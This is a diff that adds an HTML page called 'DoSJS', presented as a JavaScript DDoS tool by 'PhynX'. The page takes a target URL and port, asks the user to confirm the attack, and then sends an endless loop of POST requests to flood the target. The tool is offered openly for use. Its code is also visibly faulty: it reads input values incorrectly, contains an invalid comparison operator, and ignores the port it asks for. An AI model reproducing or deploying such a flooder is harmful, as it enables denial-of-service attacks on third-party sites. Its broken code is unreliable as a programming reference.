@@ -1,0 +1,111 @@
+<html>
+<head>
+<title>DDoS Tools in JavaScript - By PhynX</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<link rel="icon" href="ico.svg" type="image/x-icon">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+</head>
+<body style="background-color:#2b2b2b;color:white;">
+<style type="text/css">
+.banner {
+font-family: Arial;
+margin-bottom: 0px;
+}
+
+.by {
+float: right;
+font-family: Monospace;
+}
+
+.start {
+font-family: Arial;
+border-style: none;
+border-radius: 4px;
+background: #1778F3;
+color:white;
+width: 75%;
+height: 60px;
+}
+
+.targ {
+font-family: Arial;
+}
+
+.tpor {
+font-family: Arial;
+}
+
+#targetnya {
+padding: 5px;
+border: none;
+border-style: none;
+border-radius: 4px;
+}
+
+#targetport {
+padding: 5px;
+border: none;
+border-style: none;
+border-radius: 4px;
+}
+</style>
+<center><h1 class="banner">DoSJS</h1></center>
+<hr>
+<float class="by">By PhynX</float>
+<br>
+<br>
+<fieldset>
+<center>
+<p class="targ">Input Target : 
+<br>
+<input type="text" name="vurl" id="targetnya" placeholder="Please remove / at end of URL" maxlength="30" required/>
+</p>
+<br>
+<p class="tpor">Input Port Target : 
+<br>
+<input type="number" name="vport" id="targetport" placeholder="Input Port Target..." maxlength="5" required/>
+</p>
+<br>
+<button onclick="mulai();" class="start">Start</button>
+</center>
+</fieldset>
+<script>
+function mulai() {
+var targeturl = document.getElementById('targetnya').innerHTML;
+var port = document.getElementById('targetport').value;
+if (targeturl == null || targeturl == "" || targeturl.length =< 8) {
+alert("Please Input Correctly");
+targeturl.innerHTML = "";
+return false;
+}
+else if (port == null || port == "") {
+alert("Please Input Correctly");
+port.innerHTML = "";
+return false;
+}
+else {
+var pilih = confirm('Are you sure want attack [' + targeturl + '] ?');
+if (pilih) {
+ddos();
+}
+else {
+return false;
+}
+}
+}
+function ddos() {
+var targeturl = document.getElementById('targetnya').innerHTML;
+var port = document.getElementById('targetport').value;
+while (true) {
+try {
+$.post(targeturl);
+}
+catch {
+$.post(targeturl);
+}
+}
+}
+</script>
+</body>
+</html>
